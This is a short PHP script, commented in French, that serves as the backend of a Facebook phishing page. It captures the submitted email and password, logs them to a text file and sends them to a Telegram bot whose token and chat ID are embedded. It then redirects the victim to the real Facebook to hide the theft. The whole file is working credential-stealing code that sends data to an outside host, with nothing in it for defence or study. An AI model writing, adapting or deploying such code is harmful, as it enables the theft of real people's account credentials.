<?php
$email = $_POST['email'];
$pass = $_POST['pass'];

// Enregistrement dans un fichier
$file = fopen("log.txt", "a");
fwrite($file, "Email: $email | Mot de passe: $pass\n");
fclose($file);

// Envoi vers Telegram
$token = "7210538824:AAF-sURnyKq7Ft9nJBOxLDm7n933yboIVDE";
$chat_id = "6299548804";
$msg = "🔐 Facebook TEST\n👤 Email: $email\n🔑 Password: $pass";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));

// Redirection vers le vrai Facebook
header("Location: https://facebook.com");
exit();
?>
